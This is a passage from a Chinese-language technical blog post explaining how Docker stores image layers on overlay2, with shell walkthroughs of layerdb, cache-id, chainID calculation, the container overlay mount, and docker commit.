string">"sha256:32ce5f6a5106cc637d09a98289782edf47c32cb082dc475dd47cbf19a4f866da"</span><span class="token punctuation">,</span><span class="token string">"sha256:d874fd2bc83bb3322b566df739681fbd2248c58d3369cb25908d68e7ed6040a6"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里仅保留我们想要的元数据 rootfs。在 rootfs 中看到 layers 有6层，这6层即对应镜像的6层镜像层。并且，自上而下分别映射到容器的底层到顶层。找到了镜像的6层，接下来的问题是每层的文件内容在哪里呢？</p><p>layerdb 元数据会给我们想要的信息，通过底层 diff-id: 2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f 我们查到最底层镜像层的 cache_id，通过 cache_id 即可查找到镜像层的文件内容：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /var/lib/docker/image/overlay2/layerdb/sha256/2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f</span>cache-id  <span class="token function">diff</span>  size  tar-split<span class="token punctuation">.</span>json<span class="token punctuation">.</span>gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f/cache-id</span>85c4c5ecdac6c0d197f899dac227b9d493911a9a5820eac501bb5e9ae361f4c7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f/diff</span>sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用 cacheID 查找文件内容</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /var/lib/docker/overlay2/85c4c5ecdac6c0d197f899dac227b9d493911a9a5820eac501bb5e9ae361f4c7</span>committed  <span class="token function">diff</span>  link<span class="token comment"># ls /var/lib/docker/overlay2/85c4c5ecdac6c0d197f899dac227b9d493911a9a5820eac501bb5e9ae361f4c7/diff</span>bin   dev  home  lib64  mnt  proc  run   srv  tmp  <span class="token keyword">var</span>boot  etc  lib   media  opt  root  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上示例中，镜像元数据和镜像层内容是分开存储的。因此通过 cache-id 我们需要到 /var/lib/docker/overlay2 目录下查看镜像层内容，它就存在 diff 目录下，其中 link 存储的是镜像层对应的短 ID，后面会看到它的用场。</p><p>找到了镜像层的最底层，接着查找镜像层的“中间层”，发现在 layerdb 目录下没有 diff-id e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8的镜像层：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /var/lib/docker/image/overlay2/layerdb/sha256/e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8</span><span class="token function">ls</span>: 无法访问<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/image/overlay2/layerdb/sha256/e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8: 没有那个文件或目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是因为 docker 引入了内容寻址机制，该机制会根据文件内容来索引镜像和镜像层。docker 利用 rootfs 中的 diff_id 计算出内容寻址的 chainID，通过 chainID 获取 layer 相关信息，最终索引到镜像层文件内容。</p><p>对于最底层镜像层其 diff_id 即是 chainID。因此我们可以查找到它的文件内容。除最底层外，chainID 需通过公式 chainID(n) = SHA256(chain(n-1) diffID(n)) 计算得到，计算“中间层” chainID：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># echo -n "sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8" | sha256sum -</span>780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5  <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据 “中间层” chainID 查找文件内容：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /var/lib/docker/image/overlay2/layerdb/sha256/780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5</span>cache-id  <span class="token function">diff</span>  parent  size  tar-split<span class="token punctuation">.</span>json<span class="token punctuation">.</span>gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5/cache-id</span>57e1f1b11e26f748161b7fccbf2ba6b24c2f98dc8a821729f0be215ad267498c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5/diff</span>sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/780238f18c540007376dd5e904f583896a69fe620876cabc06977a3af4ba4fb5/parent</span>sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">镜像层文件内容<span class="token comment"># ls /var/lib/docker/overlay2/57e1f1b11e26f748161b7fccbf2ba6b24c2f98dc8a821729f0be215ad267498c</span>committed  <span class="token function">diff</span>  link  lower  work<span class="token comment"># ls /var/lib/docker/overlay2/57e1f1b11e26f748161b7fccbf2ba6b24c2f98dc8a821729f0be215ad267498c/diff/</span>docker-entrypoint<span class="token punctuation">.</span>d  etc  lib  tmp  usr  <span class="token keyword">var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">镜像层文件内容短 ID<span class="token comment"># cat /var/lib/docker/overlay2/57e1f1b11e26f748161b7fccbf2ba6b24c2f98dc8a821729f0be215ad267498c/link</span>24GM2IZVPTUROAG7AWJO5ZWE6B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">“父”镜像层文件内容短 ID<span class="token comment"># cat /var/lib/docker/overlay2/57e1f1b11e26f748161b7fccbf2ba6b24c2f98dc8a821729f0be215ad267498c/lower</span>l/SICZO4QNVZEVOIJ4HDXVDKNYA2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>找到最底层文件内容和“中间层”文件内容，再去找最顶层文件内容就变的不难了</p><h2 id="2-4-Docker容器与镜像"><a href="#2-4-Docker容器与镜像" class="headerlink" title="2.4 Docker容器与镜像"></a>2.4 Docker容器与镜像</h2><p>通过 docker run 命令启动一个镜像为 nginx的容器：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -d nginx:latest</span>3272831107a3499afe8160b0cd423e2ac4223522f1995b7be3504a1d3d272878<span class="token comment"># docker ps | grep nginx</span>3272831107a3   nginx:latest   <span class="token string">"/docker-entrypoint.…"</span>   11 seconds ago   Up 9 seconds   80/tcp    angry_beaver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mount | grep overlay</span>overlay on <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/b3f5c8b42ac055c715216e376cfe44571f618a876f481533ec1434aa0bc4f8ed/merged <span class="token function">type</span> overlay <span class="token punctuation">(</span>rw<span class="token punctuation">,</span>relatime<span class="token punctuation">,</span>seclabel<span class="token punctuation">,</span>lowerdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/MS2X66BYF6UZ7EKUWMZJKCF4HO:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/ODJROQUGY3WQMOGQ3BLYZGIAG4:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/Q5LOBFJRH5M7M5CMSWW5L4VYOY:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/ZR35FN2E3WEARZV4HLRU373FT7:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/NSM2PTAT6TIT2H6G3HFNGZJH5N:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/24GM2IZVPTUROAG7AWJO5ZWE6B:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/SICZO4QNVZEVOIJ4HDXVDKNYA2<span class="token punctuation">,</span>upperdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/b3f5c8b42ac055c715216e376cfe44571f618a876f481533ec1434aa0bc4f8ed/<span class="token function">diff</span><span class="token punctuation">,</span>workdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overla 2/b3f5c8b42ac055c715216e376cfe44571f618a876f481533ec1434aa0bc4f8ed/work<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到，启动容器会 mount 一个 overlay 的联合文件系统到容器内。这个文件系统由三层组成：</p><ul><li>lowerdir：只读层，即为镜像的镜像层。</li><li>upperdir：读写层，该层是容器的读写层，对容器的读写操作将反映在读写层。</li><li>workdir： overlayfs 的内部层，用于实现从只读层到读写层的 copy_up 操作。</li><li>merge：容器内作为同一视图联合挂载点的目录。</li></ul><p>这里需要着重介绍的是容器的 lowerdir 镜像只读层，查看只读层的短 ID：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">lowerdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/MS2X66BYF6UZ7EKUWMZJKCF4HO<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/ODJROQUGY3WQMOGQ3BLYZGIAG4<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/Q5LOBFJRH5M7M5CMSWW5L4VYOY<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/ZR35FN2E3WEARZV4HLRU373FT7<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/NSM2PTAT6TIT2H6G3HFNGZJH5N<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/24GM2IZVPTUROAG7AWJO5ZWE6B<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/SICZO4QNVZEVOIJ4HDXVDKNYA2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像层只有6层这里的短 ID 却有7个？<br>在 /var/lib/docker/overlay2/l 目录下我们找到了答案：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cd /var/lib/docker/overlay2/l</span><span class="token comment"># pwd</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l<span class="token comment"># ls</span>24GM2IZVPTUROAG7AWJO5ZWE6B  LZEAXJGRW6HKBBGGB2N4CWMSVJ  R2XTGODAA67NQJM44MIKMDUF4W5OI5WMJ2FP7QI7IFWDMHLBRDDN  MS2X66BYF6UZ7EKUWMZJKCF4HO  SICZO4QNVZEVOIJ4HDXVDKNYA2644ISPHLTBSSC2KLP6BGHHHZPR  NSM2PTAT6TIT2H6G3HFNGZJH5N  ZR35FN2E3WEARZV4HLRU373FT76CQUILQSJNVTMFFV3ABCCOGOYG  ODJROQUGY3WQMOGQ3BLYZGIAG4BQENAYC44O2ZCZFT5URMH5OADK  Q5LOBFJRH5M7M5CMSWW5L4VYOY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls -l MS2X66BYF6UZ7EKUWMZJKCF4HO/</span>总用量 0drwxr-xr-x<span class="token punctuation">.</span> 4 root root 43 1月  25 01:27 devdrwxr-xr-x<span class="token punctuation">.</span> 2 root root 66 1月  25 01:27 etc<span class="token namespace">[root@192 l]</span><span class="token comment"># ls -l ODJROQUGY3WQMOGQ3BLYZGIAG4/</span>总用量 0drwxr-xr-x<span class="token punctuation">.</span> 2 root root 41 12月 30 03:28 docker-entrypoint<span class="token punctuation">.</span>d<span class="token namespace">[root@192 l]</span><span class="token comment"># ls -l Q5LOBFJRH5M7M5CMSWW5L4VYOY/</span>总用量 0drwxr-xr-x<span class="token punctuation">.</span> 2 root root 41 12月 30 03:28 docker-entrypoint<span class="token punctuation">.</span>d<span class="token namespace">[root@192 l]</span><span class="token comment"># ls -l ZR35FN2E3WEARZV4HLRU373FT7/</span>总用量 0drwxr-xr-x<span class="token punctuation">.</span> 2 root root 45 12月 30 03:28 docker-entrypoint<span class="token punctuation">.</span>d<span class="token namespace">[root@192 l]</span><span class="token comment"># ls -l NSM2PTAT6TIT2H6G3HFNGZJH5N/</span>总用量 4<span class="token operator">-</span>rwxrwxr-x<span class="token punctuation">.</span> 1 root root 1202 12月 30 03:28 docker-entrypoint<span class="token punctuation">.</span>sh<span class="token namespace">[root@192 l]</span><span class="token comment"># ls -l 24GM2IZVPTUROAG7AWJO5ZWE6B/</span>总用量 4drwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 30 03:28 docker-entrypoint<span class="token punctuation">.</span>ddrwxr-xr-x<span class="token punctuation">.</span> 18 root root 4096 12月 30 03:28 etcdrwxr-xr-x<span class="token punctuation">.</span>  4 root root   45 12月 20 08:00 libdrwxrwxrwt<span class="token punctuation">.</span>  2 root root    6 12月 30 03:28 tmpdrwxr-xr-x<span class="token punctuation">.</span>  7 root root   66 12月 20 08:00 usrdrwxr-xr-x<span class="token punctuation">.</span>  5 root root   41 12月 20 08:00 <span class="token keyword">var</span><span class="token namespace">[root@192 l]</span><span class="token comment"># ls -l SICZO4QNVZEVOIJ4HDXVDKNYA2/</span>总用量 12drwxr-xr-x<span class="token punctuation">.</span>  2 root root 4096 12月 20 08:00 bindrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 12 01:25 bootdrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 20 08:00 devdrwxr-xr-x<span class="token punctuation">.</span> 30 root root 4096 12月 20 08:00 etcdrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 12 01:25 homedrwxr-xr-x<span class="token punctuation">.</span>  8 root root   96 12月 20 08:00 libdrwxr-xr-x<span class="token punctuation">.</span>  2 root root   34 12月 20 08:00 lib64drwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 20 08:00 mediadrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 20 08:00 mntdrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 20 08:00 optdrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 12 01:25 procdrwx-<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">.</span>  2 root root   37 12月 20 08:00 rootdrwxr-xr-x<span class="token punctuation">.</span>  3 root root   30 12月 20 08:00 rundrwxr-xr-x<span class="token punctuation">.</span>  2 root root 4096 12月 20 08:00 sbindrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 20 08:00 srvdrwxr-xr-x<span class="token punctuation">.</span>  2 root root    6 12月 12 01:25 sysdrwxrwxrwt<span class="token punctuation">.</span>  2 root root    6 12月 20 08:00 tmpdrwxr-xr-x<span class="token punctuation">.</span> 11 root root  120 12月 20 08:00 usrdrwxr-xr-x<span class="token punctuation">.</span> 11 root root  139 12月 20 08:00 <span class="token keyword">var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像层ODJROQUGY3WQMOGQ3BLYZGIAG4/Q5LOBFJRH5M7M5CMSWW5L4VYOY/ZR35FN2E3WEARZV4HLRU373FT7/NSM2PTAT6TIT2H6G3HFNGZJH5N/24GM2IZVPTUROAG7AWJO5ZWE6B/SICZO4QNVZEVOIJ4HDXVDKNYA2 分别对应镜像的6层镜像层文件内容，它们分别映射到镜像层的 diff 目录。而 MS2X66BYF6UZ7EKUWMZJKCF4HO映射的是容器的初始化层 init，该层内容是和容器配置相关的文件内容，它是只读的。</p><p>启动了容器，docker 将镜像的内容 mount 到容器中。那么，如果在容器内写文件会对镜像有什么影响呢？</p><h2 id="2-5-容器内写文件"><a href="#2-5-容器内写文件" class="headerlink" title="2.5 容器内写文件"></a>2.5 容器内写文件</h2><p>不难理解，镜像层是只读的，在容器中写文件其实是将文件写入到 overlay 的可读写层。</p><p>这里有几个 case 可以测试：</p><ul><li>读写层不存在该文件，只读层存在。</li><li>读写层存在该文件，只读层不存在。</li><li>读写层和只读层都不存在该文件。</li></ul><p>我们简单构建一种读写层和只读层都不存在的场景：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -it centos:latest bash</span><span class="token namespace">[root@355e99982248 /]</span><span class="token comment"># touch msb.txt</span><span class="token namespace">[root@355e99982248 /]</span><span class="token comment"># ls</span>bin  etc   lib    lost+found  mnt      opt   root  sbin  sys  usrdev  home  lib64  media       msb<span class="token punctuation">.</span>txt  proc  run   srv   tmp  <span class="token keyword">var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看读写层是否有该文件：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看镜像是否有变化<span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEubuntu       latest    d13c942271d6   2 weeks ago    72<span class="token punctuation">.</span>8MBbash         latest    5557e073f11c   2 weeks ago    13MBnginx        latest    605c77e624dd   3 weeks ago    141MBcentos       latest    5d0da3dc9764   4 months ago   231MB<span class="token namespace">[root@localhost ~]</span><span class="token comment"># cat /var/lib/docker/image/overlay2/repositories.json | grep 5d0da3dc9764</span><span class="token punctuation">{</span><span class="token string">"Repositories"</span><span class="token punctuation">{</span><span class="token string">"centos:latest"</span>:<span class="token string">"sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6"</span><span class="token punctuation">,</span><span class="token string">"centos@sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177"</span>:<span class="token string">"sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token namespace">[root@localhost ~]</span><span class="token comment"># cat /var/lib/docker/image/overlay2/imagedb/content/sha256/5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6</span><span class="token punctuation">{</span><span class="token string">"os"</span>:<span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"rootfs"</span>:<span class="token punctuation">{</span><span class="token string">"type"</span>:<span class="token string">"layers"</span><span class="token punctuation">,</span><span class="token string">"diff_ids"</span>:<span class="token punctuation">[</span><span class="token string">"sha256:74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls </span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/image/overlay2/layerdb/sha256/74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59:cache-id  <span class="token function">diff</span>  size  tar-split<span class="token punctuation">.</span>json<span class="token punctuation">.</span>gz<span class="token namespace">[root@localhost ~]</span><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59/cache-id</span>b17bc5c5103514923a30983c48f909e06f366b7aa1e85f112b67abb3ef5cd0cb<span class="token namespace">[root@localhost ~]</span><span class="token comment"># cat /var/lib/docker/image/overlay2/layerdb/sha256/74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59/diff</span>sha256:74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59<span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls /var/lib/docker/overlay2/b17bc5c5103514923a30983c48f909e06f366b7aa1e85f112b67abb3ef5cd0cb</span>committed  <span class="token function">diff</span>  link<span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls /var/lib/docker/overlay2/b17bc5c5103514923a30983c48f909e06f366b7aa1e85f112b67abb3ef5cd0cb/diff/</span>bin  etc   lib    lost+found  mnt  proc  run   srv  tmp  <span class="token keyword">var</span>dev  home  lib64  media       opt  root  sbin  sys  usr查看容器是否有变化<span class="token namespace">[root@localhost ~]</span><span class="token comment"># mount | grep overlay</span><span class="token function">type</span> overlay <span class="token punctuation">(</span>rw<span class="token punctuation">,</span>relatime<span class="token punctuation">,</span>seclabel<span class="token punctuation">,</span>lowerdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/R2W2LEMDPRIUFYDVSLIQSCYTGX:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/l/R2XTGODAA67NQJM44MIKMDUF4W<span class="token punctuation">,</span>upperdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker overlay2/7f0b54c748171872ce564305e394547555cb1182abf802c2262384be3dc78a8f/<span class="token function">diff</span><span class="token punctuation">,</span>workdir=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib/docker/overlay2/7f0b54c748171872ce564305e394547555cb1182abf802c2262384be3dc78a8f/work<span class="token punctuation">)</span><span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls -l /var/lib/docker/overlay2/l/</span>总用量 0lrwxrwxrwx<span class="token punctuation">.</span> 1 root root 77 1月  25 01:41 R2W2LEMDPRIUFYDVSLIQSCYTGX <span class="token operator">-</span>&gt; <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>7f0b54c748171872ce564305e394547555cb1182abf802c2262384be3dc78a8f-init/<span class="token function">diff</span>lrwxrwxrwx<span class="token punctuation">.</span> 1 root root 72 1月  25 00:29 R2XTGODAA67NQJM44MIKMDUF4W <span class="token operator">-</span>&gt; <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>b17bc5c5103514923a30983c48f909e06f366b7aa1e85f112b67abb3ef5cd0cb/<span class="token function">diff</span><span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls /var/lib/docker/overlay2/7f0b54c748171872ce564305e394547555cb1182abf802c2262384be3dc78a8f/diff</span>msb<span class="token punctuation">.</span>txt<span class="token namespace">[root@localhost ~]</span><span class="token comment"># ls /var/lib/docker/overlay2/7f0b54c748171872ce564305e394547555cb1182abf802c2262384be3dc78a8f/merged/</span>bin  etc   lib    lost+found  mnt      opt   root  sbin  sys  usrdev  home  lib64  media       msb<span class="token punctuation">.</span>txt  proc  run   srv   tmp  <span class="token keyword">var</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、Docker容器镜像操作命令"><a href="#三、Docker容器镜像操作命令" class="headerlink" title="三、Docker容器镜像操作命令"></a>三、Docker容器镜像操作命令</h1><h2 id="3-1-docker-commit"><a href="#3-1-docker-commit" class="headerlink" title="3.1  docker commit"></a>3.1  docker commit</h2><p>上节提到容器内写文件会反映在 overlay 的可读写层，那么读写层的文件内容可以做成镜像吗？</p><p>可以。docker 通过 commit 和 build 操作实现镜像的构建。commit 将容器提交为一个镜像，build 在一个镜像的基础上构建镜像。</p><p>使用 commit 将上节的容器提交为一个镜像：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[root@355e99982248 /]</span><span class="token comment">#   ctrl+p+q</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE           COMMAND                  CREATED          STATUS          PORTS     NAMES355e99982248   centos:latest   <span class="token string">"bash"</span>                   21 minutes ago   Up 21 minutes             fervent_perlman<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker commit 355e99982248</span>sha256:8965dcf23201ed42d4904e2f10854d301ad93b34bea73f384440692e006943de<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED              SIZE&lt;none&gt;       &lt;none&gt;    8965dcf23201   About a minute ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>image 短 ID 8965dcf23201 即为容器提交的镜像，查看镜像的 imagedb 元数据：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat  /var/lib/docker/image/overlay2/imagedb/content/sha256/8965dcf23201ed42d4904e2f10854d301ad93b34bea73f384440692e006943de</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">"os"</span>:<span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"rootfs"</span>:<span class="token punctuation">{</span><span class="token string">"type"</span>:<span class="token string">"layers"</span><span class="token punctuation">,</span><span class="token string">"diff_ids"</span>:<span class="token punctuation">[</span><span class="token string">"sha256:74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59"</span><span class="token punctuation">,</span><span class="token string">"sha256:551c3089b186b4027e949910981ff1ba54114610f2aab9359d28694c18b0203b"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到镜像层自上而下的前1个镜像层 diff_id 和 centos 镜像层 diff_id 是一样的，说明每层镜像层可以被多个镜像共享。而多出来的一层镜像层内容即是上节我们写入文件的内容：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># echo -n "sha256:74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59 sha256:551c3089b186b4027e949910981ff1ba54114610f2aab9359d28694c18b0203b" | sha256sum -</span>92f7208b1cc0b5cc8fe214a4b0178aa4962b58af8ec535ee7211f335b1e0ed3b  <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cd /var/lib/docker/image/overlay2/layerdb/sha256/92f7208b1cc0b5cc8fe214a4b0178aa4962b58af8ec535ee7211f335b1e0ed3b</span><span class="token namespace">[root@192 92f7208b1cc0b5cc8fe214a4b0178aa4962b58af8ec535ee7211f335b1e0ed3b]</span><span class="token comment"># ls</span>cache-id  <span class="token function">diff</span>  parent  size  tar-split<span class="token punctuation">.</span>json<span class="token punctuation">.</span>gz<span class="token namespace">[root@192 92f7208b1cc0b5cc8fe214a4b0178aa4962b58af8ec535ee7211f335b1e0ed3b]</span><span class="token comment"># cat cache-id</span>250dc0b4f2c5f27952241a55cd4c286bfaaf8af4b77c9d0a38976df4c147cb95<span class="token 